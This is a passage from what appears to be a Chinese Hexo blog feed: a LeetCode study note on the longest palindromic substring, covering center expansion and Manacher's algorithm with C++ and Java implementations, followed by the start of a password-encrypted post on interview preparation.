mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">==</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span><span style="top:-1.53em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mrel">=</span><span class="mspace" style="margin-right:1em;"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∧</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">==</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.91em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></p><p>找出其中的状态转移链：</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mo stretchy="false">(</mo><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo stretchy="false">)</mo><mo>←</mo><mi>P</mi><mo stretchy="false">(</mo><mi>i</mi><mo>+</mo><mn>1</mn><mo separator="true">,</mo><mi>j</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo>←</mo><mi>P</mi><mo stretchy="false">(</mo><mi>i</mi><mo>+</mo><mn>2</mn><mo separator="true">,</mo><mi>j</mi><mo>−</mo><mn>2</mn><mo stretchy="false">)</mo><mo>←</mo><mo>⋯</mo><mo>←</mo><mtext>某一边界情况</mtext></mrow><annotation encoding="application/x-tex">P(i, j) \leftarrow P(i+1, j-1) \leftarrow P(i+2, j-2) \leftarrow \cdots \leftarrow \text{某一边界情况}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">←</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">←</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">←</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.3669em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">←</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord text"><span class="mord cjk_fallback">某一边界情况</span></span></span></span></span></p><p>可以发现，所有的状态在转移的时候的可能性都是唯一的。也就是说，我们可以从每一种边界情况开始「扩展」，也可以得出所有的状态对应的答案。</p><p>边界情况即为子串长度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> 或 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn></mrow><annotation encoding="application/x-tex">2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2</span></span></span></span> 的情况。我们枚举每一种边界情况，并从对应的子串开始不断地向两边扩展。如果两边的字母相同，我们就可以继续扩展，例如从 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mo stretchy="false">(</mo><mi>i</mi><mo>+</mo><mn>1</mn><mo separator="true">,</mo><mi>j</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">P(i+1,j−1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span> 扩展到 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mo stretchy="false">(</mo><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">P(i,j)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">)</span></span></span></span>；如果两边的字母不同，我们就可以停止扩展，因为在这之后的子串都不能是回文串了。</p><p>聪明的读者此时应该可以发现，「边界情况」对应的子串实际上就是我们「扩展」出的回文串的「回文中心」。方法二的本质即为：我们枚举所有的「回文中心」并尝试「扩展」，直到无法扩展为止，此时的回文串长度即为此「回文中心」下的最长回文串长度。我们对所有的长度求出最大值，即可得到最终的答案。</p><p>作者：LeetCode-Solution</p></blockquote><p>用 c++ 实现了一下这个方法：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; <span class="title">hanshu</span><span class="params">(<span class="keyword">const</span> string&amp; s, <span class="keyword">int</span> start, <span class="keyword">int</span> end)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(start &gt;= <span class="number">0</span> &amp;&amp; end &lt;= s.<span class="built_in">size</span>() &amp;&amp; s[end] == s[start])&#123;</span><br><span class="line">            --start;</span><br><span class="line">            ++end;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> &#123;++start, --end&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">string <span class="title">longestPalindrome</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> start = <span class="number">0</span>, end = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">auto</span> [start1, end1] = <span class="built_in">hanshu</span>(s, i, i);</span><br><span class="line">            <span class="keyword">auto</span> [start2, end2] = <span class="built_in">hanshu</span>(s, i, i + <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span>(end1 - start1 &gt; end - start) &#123;</span><br><span class="line">                start = start1;</span><br><span class="line">                end = end1;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(end2 - start2 &gt; end - start) &#123;</span><br><span class="line">                start = start2;</span><br><span class="line">                end = end2;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> s.<span class="built_in">substr</span>(start, end - start + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><p>执行用时: <strong>20 ms</strong></p></li><li><p>内存消耗: <strong>6.8 MB</strong></p></li></ul><p>看完题解，发现这个方法原理就是我的初始代码，那么问题来了，相同原理怎么别人设计的程序就这么精炼巧妙……</p><p>依然练习练习使用 Java 来实现：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">longestPalindrome</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(s.length() &lt; <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> s;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> start = <span class="number">0</span>, end = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s.length(); i++) &#123;</span><br><span class="line">            <span class="keyword">int</span> len1 = hanshu(s, i, i);</span><br><span class="line">            <span class="keyword">int</span> len2 = hanshu(s, i, i + <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">int</span> len = Math.max(len1, len2);</span><br><span class="line">            <span class="keyword">if</span>(len &gt; end - start + <span class="number">1</span>) &#123;</span><br><span class="line">                start = i - (len - <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line">                end = i + len / <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> s.substring(start, end + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hanshu</span><span class="params">(String s , <span class="keyword">int</span> start, <span class="keyword">int</span> end)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(start &gt;= <span class="number">0</span> &amp;&amp; end &lt; s.length() &amp;&amp; s.charAt(start) == s.charAt(end)) &#123;</span><br><span class="line">            --start;</span><br><span class="line">            ++end;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> end - start - <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>执行用时: <strong>25 ms</strong></p></li><li><p>内存消耗: <strong>38.6 MB</strong></p></li></ul><p>每次都对着修改到一模一样才能通过编译……</p><p>官方的第三种解法是：</p><h4 id="Manacher-算法（据说非常复杂）">Manacher 算法（据说非常复杂）</h4><blockquote><p>为了表述方便，我们定义一个新概念臂长，表示中心扩展算法向外扩展的长度。如果一个位置的最大回文字符串长度为 <code>2 * length + 1</code> ，其臂长为 <code>length</code>。</p><p>下面的讨论只涉及长度为奇数的回文字符串。长度为偶数的回文字符串我们将会在最后与长度为奇数的情况统一起来。</p><p><strong>思路与算法</strong></p><p>在中心扩展算法的过程中，我们能够得出每个位置的臂长。那么当我们要得出以下一个位置 i 的臂长时，能不能利用之前得到的信息呢？</p><p>答案是肯定的。具体来说，如果位置 <code>j</code> 的臂长为 <code>length</code>，并且有 <code>j + length &gt; i</code>，如下图所示：</p><p><img src="5_fig1.png" alt=""></p><p>当在位置 <code>i</code> 开始进行中心拓展时，我们可以先找到 <code>i</code> 关于 <code>j</code> 的对称点 <code>2 * j - i</code>。那么如果点 <code>2 * j - i</code> 的臂长等于 <code>n</code>，我们就可以知道，点 <code>i</code> 的臂长至少为 <code>min(j + length - i, n)</code>。那么我们就可以直接跳过 <code>i</code> 到 <code>i + min(j + length - i, n)</code> 这部分，从 <code>i + min(j + length - i, n) + 1</code> 开始拓展。</p><p>我们只需要在中心扩展法的过程中记录右臂在最右边的回文字符串，将其中心作为 <code>j</code>，在计算过程中就能最大限度地避免重复计算。</p><p>那么现在还有一个问题：如何处理长度为偶数的回文字符串呢？</p><p>我们可以通过一个特别的操作将奇偶数的情况统一起来：我们向字符串的头尾以及每两个字符中间添加一个特殊字符 <code>#</code>，比如字符串 <code>aaba</code> 处理后会变成 <code>#a#a#b#a#</code>。那么原先长度为偶数的回文字符串 <code>aa</code> 会变成长度为奇数的回文字符串 <code>#a#a#</code>，而长度为奇数的回文字符串 <code>aba</code> 会变成长度仍然为奇数的回文字符串 <code>#a#b#a#</code>，我们就不需要再考虑长度为偶数的回文字符串了。</p><p>注意这里的特殊字符不需要是没有出现过的字母，我们可以使用任何一个字符来作为这个特殊字符。这是因为，当我们只考虑长度为奇数的回文字符串时，每次我们比较的两个字符奇偶性一定是相同的，所以原来字符串中的字符不会与插入的特殊字符互相比较，不会因此产生问题。</p><p>作者：LeetCode-Solution</p></blockquote><p>主题思路与「中心扩展算法」一样，但增加了避免重复计算的语句，经典以头发换效率。这里贴出官方 C++ 源代码，日后复习再复现一遍：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    int expand(const string&amp; s, int left, int right) &#123;</span><br><span class="line">        while (left &gt;= 0 &amp;&amp; right &lt; s.size() &amp;&amp; s[left] == s[right]) &#123;</span><br><span class="line">            --left;</span><br><span class="line">            ++right;</span><br><span class="line">        &#125;</span><br><span class="line">        return (right - left - 2) / 2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    string longestPalindrome(string s) &#123;</span><br><span class="line">        int start = 0, end = -1;</span><br><span class="line">        string t = &quot;#&quot;;</span><br><span class="line">        for (char c: s) &#123;</span><br><span class="line">            t += c;</span><br><span class="line">            t += &#x27;#&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">        t += &#x27;#&#x27;;</span><br><span class="line">        s = t;</span><br><span class="line"></span><br><span class="line">        vector&lt;int&gt; arm_len;</span><br><span class="line">        int right = -1, j = -1;</span><br><span class="line">        for (int i = 0; i &lt; s.size(); ++i) &#123;</span><br><span class="line">            int cur_arm_len;</span><br><span class="line">            if (right &gt;= i) &#123;</span><br><span class="line">                int i_sym = j * 2 - i;</span><br><span class="line">                int min_arm_len = min(arm_len[i_sym], right - i);</span><br><span class="line">                cur_arm_len = expand(s, i - min_arm_len, i + min_arm_len);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                cur_arm_len = expand(s, i, i);</span><br><span class="line">            &#125;</span><br><span class="line">            arm_len.push_back(cur_arm_len);</span><br><span class="line">            if (i + cur_arm_len &gt; right) &#123;</span><br><span class="line">                j = i;</span><br><span class="line">                right = i + cur_arm_len;</span><br><span class="line">            &#125;</span><br><span class="line">            if (cur_arm_len * 2 + 1 &gt; end - start) &#123;</span><br><span class="line">                start = i - cur_arm_len;</span><br><span class="line">                end = i + cur_arm_len;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        string ans;</span><br><span class="line">        for (int i = start; i &lt;= end; ++i) &#123;</span><br><span class="line">            if (s[i] != &#x27;#&#x27;) &#123;</span><br><span class="line">                ans += s[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">作者：LeetCode-Solution</span><br></pre></td></tr></table></figure><ul><li>执行用时: <strong>8 ms</strong></li><li>内存消耗: <strong>10.9 MB</strong></li></ul><p>这里用 Java 复现一遍：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">longestPalindrome</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        StringBuffer sb = <span class="keyword">new</span> StringBuffer(<span class="string">&quot;#&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s.length(); i++) &#123;</span><br><span class="line">            sb.append(s.charAt(i));</span><br><span class="line">            sb.append(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        s = sb.toString();</span><br><span class="line"></span><br><span class="line">        List&lt;Integer&gt; arm_len = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">        <span class="keyword">int</span> start = <span class="number">0</span>, end = -<span class="number">1</span>, right = -<span class="number">1</span>, j = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s.length(); i++) &#123;</span><br><span class="line">            <span class="keyword">int</span> len;</span><br><span class="line">            <span class="keyword">if</span>(right &gt;= i) &#123;</span><br><span class="line">                <span class="keyword">int</span> i0 = j * <span class="number">2</span> - i;</span><br><span class="line">                <span class="keyword">int</span> min = Math.min(arm_len.get(i0), right - i);</span><br><span class="line">                len = hanshu(s, i - min, i + min);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                len = hanshu(s, i, i);</span><br><span class="line">            &#125;</span><br><span class="line">            arm_len.add(len);</span><br><span class="line">            <span class="keyword">if</span>(i + len &gt; right) &#123;</span><br><span class="line">                j = i;</span><br><span class="line">                right = i + len;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(len * <span class="number">2</span> + <span class="number">1</span> &gt; end - start) &#123;</span><br><span class="line">                start = i - len;</span><br><span class="line">                end = i + len;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        StringBuffer sb0 = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = start; i &lt;= end; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(s.charAt(i) != <span class="string">&#x27;#&#x27;</span>) &#123;</span><br><span class="line">                sb0.append(s.charAt(i));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> sb0.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hanshu</span><span class="params">(String s , <span class="keyword">int</span> start, <span class="keyword">int</span> end)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(start &gt;= <span class="number">0</span> &amp;&amp; end &lt; s.length() &amp;&amp; s.charAt(start) == s.charAt(end)) &#123;</span><br><span class="line">            --start;</span><br><span class="line">            ++end;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (end - start - <span class="number">2</span>) / <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>执行用时: <strong>19 ms</strong></p></li><li><p>内存消耗: <strong>38.9 MB</strong></p></li></ul><blockquote><p><strong>总结</strong></p><p>虽然篇幅不小，但今天依旧只做了一道题……</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> 刷题 </tag>
            
            <tag> 算法 </tag>
            
            <tag> Java </tag>
            
            <tag> C++ </tag>
            
            <tag> 动态规划 </tag>
            
            <tag> 中心扩展 </tag>
            
            <tag> Manacher算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>面试法典</title>
      <link href="/posts/6f37c8d7/"/>
      <url>/posts/6f37c8d7/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="啊这，你乱打的是吧。" data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="dadc0badb1c8da3561f1cb0b72ae72244843af74fc5b0088bc1c46e6fefb07bb">1aabc64a63ebdbe7d13368350b91c5b2ad366de3c9eb7d7727375590128917946f5ed71f12ee836411b8e701cf2be1ae92f68efb2a02f9ce5298ececb5d946fb4e123cebb601ccc9f2f5628f14a587fd452df3412bc71a163d633303c1eeb4c0f341af8c7931172bd1487396c3a257502a7911d42c90bc6cad95ff2862fec9c9b433a8449d798196987b2f40e4a757580c3eb3b045ae7504499d450595d482347c73e237a8d9787ba9630e1fb65506e02ea7f0516abc7e52c2794ed98ff81ceef81ef74abdbad0963d0c101a4a7f2785c97d0764648d82ce08f317a7e3540bf7b63f2e0c55e6ea45889eebdbfa164398099cc643de3345eeec54f2b421a83b1452429dfc66675e0f1756a69240f22e1f0b3da4208db8ba6157e312308ba62c3d6a9f65ceadabce97d5b116e9ad029096032b52c731705b2bee00a6b898c3e7c5ba22352beb18a443b59f131bfa31219ed7e80e2bc4fc903424088f8b67c52f71cc65d8cd1c99adf4e8a465e1db2b2a09abe96bd3768d912bd577db33606755da991672c991bbc4ffb843056438fed09654012a604f8efffd46d25004a4176829cae284d6663aeda2f002a8807cb3b795651e2b093d50aa715b8651379cc439e93161409978cdb49401f43723dbabbdc2aefd7efaf69faf4e4ca8269894259cfcd6bb87107304574a46672807d023ab37b6f2c2aa1f2bff128bac3378aed430a08b0514540c2b4e750057581f13c3dbdaf41b4c8d518a959fb24a7c7387605f46b6d0c5d9d7f22d82b724878a0c8aaee34b08e1aaa03994a76d305e542a58a647c4efd1aae3d6722390be2205306f6ed9d2f63f8088ba79d74f6505c77e9d355615dbf6fce78640e3df95fed0b75e4f2e9e7a295211827cdd8b6acfd449bff4d3714f5865efb7f15500a91cf2e1fa3797508678828ff4d59ae41786f60b037441482fc9cde056322fd0c491855caf0c790e87cc94b1a2e1a409cb26ed3adb2c067cc2d12f330cdb2d3e7fb864e2dc282078bf8a361a8d60cc38c0dd2519025c3dd2a7e2260feca991af3faf1cb1627102386daec74c3a06e85d782cb186ff67b43d8a17ff73494144400dc51dd864f0c49d6d98624444dc3eab76754ea72bd9ba18271040c6916402d9c3f5f0c902c0440fda7012f5bd742151c601f51abe5040a0cb86026672fe15ada3952b881e95c4657445089c2995ed6e32812d0cce068905b1300000ec3a1fd29d73519ff1ebad9c965aacbc9d5df30f72f276da4e292bb36784fcdf6dad411751070533d272aa3dfd1269c4f4cda18be9e16c39758955d32a3ce2b679dce638aa